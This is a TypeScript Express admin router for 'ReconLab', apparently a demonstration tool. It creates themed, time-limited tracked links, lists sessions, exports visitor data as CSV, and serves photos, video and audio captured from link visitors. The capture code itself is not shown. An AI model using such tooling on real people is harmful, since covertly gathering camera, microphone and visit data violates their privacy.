import { Router, Request, Response } from 'express';
import { upload } from '../middleware/upload';
import { mediaStorage } from '../services/mediaStore';
import { generateCsv } from '../services/csvExport';
import { config } from '../config';
import {
  createSession,
  createPracticeSession,
  getAllSessions,
  getSession,
  setMedia,
  terminateSession,
  isSessionUsable,
  getStats,
} from '../services/sessionStore';
import { getAuditEvents, recordAudit } from '../services/auditLog';
import { verifyAdminCredentials } from '../middleware/auth';
import { MediaType, DemoListItem } from '../types';

const router = Router();

router.get('/auth', (req: Request, res: Response) => {
  if (!verifyAdminCredentials(req)) {
    res.setHeader('WWW-Authenticate', 'Basic realm="ReconLab Admin"');
    res.status(401).json({ error: 'Invalid admin credentials', code: 'AUTH_INVALID' });
    return;
  }
  res.json({ authenticated: true });
});

router.get('/audit', (_req: Request, res: Response) => {
  res.json(getAuditEvents());
});

// ─── GET /api/admin/stats ────────────────────────────────────────────────────
router.get('/stats', (_req: Request, res: Response) => {
  res.json(getStats());
});

// ─── POST /api/admin/urls — Create a new tracked URL ─────────────────────────
router.post('/urls', upload.single('media'), async (req: Request, res: Response) => {
  try {
    const mediaType = req.body.mediaType as MediaType;
    const durationHours = parseFloat(req.body.durationHours);
    const contentUrl = (req.body.contentUrl as string | undefined) || null;

    // Theme fields
    const theme = req.body.theme || 'custom';
    const themeLabel = req.body.themeLabel || 'Custom';
    const themeCaption = req.body.themeCaption || '';
    const themeLinkText = req.body.themeLinkText || 'Open';
    const themeEmoji = req.body.themeEmoji || '🔗';
    const practice = req.body.practice === 'true' || req.body.practice === true;

    // Validate media type
    if (!['image', 'pdf', 'video'].includes(mediaType)) {
      res.status(400).json({ error: 'Invalid media type', code: 'INVALID_MEDIA_TYPE' });
      return;
    }

    // Validate duration
    const validDurations = [1, 6, 12, 24];
    const devDurations = [1 / 60, 5 / 60, 10 / 60];
    const allValid = config.enableShortDurations
      ? [...devDurations, ...validDurations]
      : validDurations;

    if (isNaN(durationHours) || !allValid.some(d => Math.abs(d - durationHours) < 0.001)) {
      // Allow custom durations between 0.25h and 48h
      if (isNaN(durationHours) || durationHours < (config.enableShortDurations ? 1 / 60 : 0.25) || durationHours > 48) {
        res.status(400).json({ error: 'Invalid duration', code: 'INVALID_DURATION' });
        return;
      }
    }

    // For image/video: require contentUrl
    if (mediaType === 'image' || mediaType === 'video') {
      if (!contentUrl || !contentUrl.startsWith('http')) {
        res.status(400).json({ error: 'A valid content URL is required for image/video', code: 'NO_CONTENT_URL' });
        return;
      }
    }

    // For PDF: require file upload
    if (mediaType === 'pdf') {
      if (!req.file) {
        res.status(400).json({ error: 'No file uploaded', code: 'NO_FILE' });
        return;
      }
      const mimeTypes = config.allowedMimeTypes[mediaType];
      if (!mimeTypes.includes(req.file.mimetype)) {
        res.status(400).json({
          error: `File type ${req.file.mimetype} does not match declared media type ${mediaType}`,
          code: 'MIME_MISMATCH',
        });
        return;
      }
    }

    // Create session
    const sessionParams = {
      mediaType,
      durationHours,
      contentUrl: mediaType !== 'pdf' ? contentUrl : null,
      theme,
      themeLabel,
      themeCaption,
      themeLinkText,
      themeEmoji,
      practice,
    };
    const session = practice ? createPracticeSession(sessionParams) : createSession(sessionParams);
    recordAudit('demo_link_generated', session.demoId);

    // Save PDF file if provided
    if (req.file && mediaType === 'pdf') {
      const mediaId = await mediaStorage.save(req.file.originalname, req.file.buffer);
      setMedia(session.demoId, mediaId, req.file.originalname);
    }

    res.status(201).json({
      demoId: session.demoId,
      visitorUrl: `/r/${session.demoId}`,
      expiresAt: session.expiresAt,
      status: session.status,
      theme: session.theme,
      themeLabel: session.themeLabel,
    });
  } catch (err: any) {
    console.error('[admin] Create URL error:', err);
    res.status(500).json({ error: 'Internal server error', code: 'SERVER_ERROR' });
  }
});

// ─── GET /api/admin/urls — List all sessions ──────────────────────────────────
router.get('/urls', (_req: Request, res: Response) => {
  const sessions = getAllSessions();
  const list: DemoListItem[] = sessions.map(s => ({
    demoId: s.demoId,
    mediaType: s.mediaType,
    mediaFilename: s.mediaFilename,
    contentUrl: s.contentUrl,
    theme: s.theme,
    themeLabel: s.themeLabel,
    themeEmoji: s.themeEmoji,
    themeCaption: s.themeCaption,
    themeLinkText: s.themeLinkText,
    createdAt: s.createdAt,
    expiresAt: s.expiresAt,
    status: s.status,
    visitCount: s.visitCount,
    durationHours: s.durationHours,
    practice: s.practice,
  }));
  res.json(list);
});

// ─── GET /api/admin/urls/:id — Get full session detail ────────────────────────
router.get('/urls/:id', (req: Request, res: Response) => {
  const demoId = req.params.id || '';
  const session = getSession(demoId);
  if (!session) {
    res.status(404).json({ error: 'Not found', code: 'NOT_FOUND' });
    return;
  }
  res.json(session);
});

// ─── POST /api/admin/urls/:id/terminate ───────────────────────────────────────
router.post('/urls/:id/terminate', (req: Request, res: Response) => {
  const demoId = req.params.id || '';
  const session = getSession(demoId);
  if (!session) {
    res.status(404).json({ error: 'Not found', code: 'NOT_FOUND' });
    return;
  }
  if (session.status === 'terminated') {
    res.status(400).json({ error: 'Already terminated', code: 'ALREADY_TERMINATED' });
    return;
  }
  const terminated = terminateSession(demoId);
  recordAudit('session_terminated', demoId);
  res.json({ status: terminated?.status, message: 'URL terminated' });
});

// ─── GET /api/admin/urls/:id/csv — Export CSV ─────────────────────────────────
router.get('/urls/:id/csv', (req: Request, res: Response) => {
  const demoId = req.params.id || '';
  const session = getSession(demoId);
  if (!session) {
    res.status(404).json({ error: 'Not found', code: 'NOT_FOUND' });
    return;
  }
  if (session.status === 'terminated' || session.status === 'expired' || !isSessionUsable(session)) {
    res.status(410).json({ error: 'This session has ended. CSV is no longer available.', code: 'SESSION_ENDED' });
    return;
  }
  if (session.practice && req.query.includePractice !== 'true') {
    res.status(403).json({ error: 'Practice sessions are excluded from CSV by default.', code: 'PRACTICE_EXPORT_EXCLUDED' });
    return;
  }
  const csv = generateCsv(session);
  recordAudit('data_exported', session.demoId);
  res.setHeader('Content-Type', 'text/csv');
  res.setHeader('Content-Disposition', `attachment; filename="reconlab_${session.demoId}.csv"`);
  res.send(csv);
});

// ─── GET /api/admin/urls/:id/photo — Serve captured photo ─────────────────────
router.get('/urls/:id/photo', (req: Request, res: Response) => {
  const demoId = req.params.id || '';
  const session = getSession(demoId);
  if (!session?.capturedPhotoRef) {
    res.status(404).json({ error: 'No photo', code: 'NOT_FOUND' });
    return;
  }
  const filePath = mediaStorage.getPath(session.capturedPhotoRef);
  if (!filePath) {
    res.status(404).json({ error: 'File not found', code: 'NOT_FOUND' });
    return;
  }
  res.setHeader('Content-Type', 'image/jpeg');
  res.sendFile(filePath);
});

// ─── GET /api/admin/urls/:id/video — Serve captured video ─────────────────────
router.get('/urls/:id/video', (req: Request, res: Response) => {
  const demoId = req.params.id || '';
  const session = getSession(demoId);
  if (!session?.capturedVideoRef) {
    res.status(404).json({ error: 'No video', code: 'NOT_FOUND' });
    return;
  }
  const filePath = mediaStorage.getPath(session.capturedVideoRef);
  if (!filePath) {
    res.status(404).json({ error: 'File not found', code: 'NOT_FOUND' });
    return;
  }
  res.setHeader('Content-Type', 'video/webm');
  res.sendFile(filePath);
});

// ─── GET /api/admin/urls/:id/audio — Serve captured audio ─────────────────────
router.get('/urls/:id/audio', (req: Request, res: Response) => {
  const demoId = req.params.id || '';
  const session = getSession(demoId);
  if (!session?.capturedAudioRef) {
    res.status(404).json({ error: 'No audio', code: 'NOT_FOUND' });
    return;
  }
  const filePath = mediaStorage.getPath(session.capturedAudioRef);
  if (!filePath) {
    res.status(404).json({ error: 'File not found', code: 'NOT_FOUND' });
    return;
  }
  res.setHeader('Content-Type', 'audio/webm');
  res.sendFile(filePath);
});

export default router;
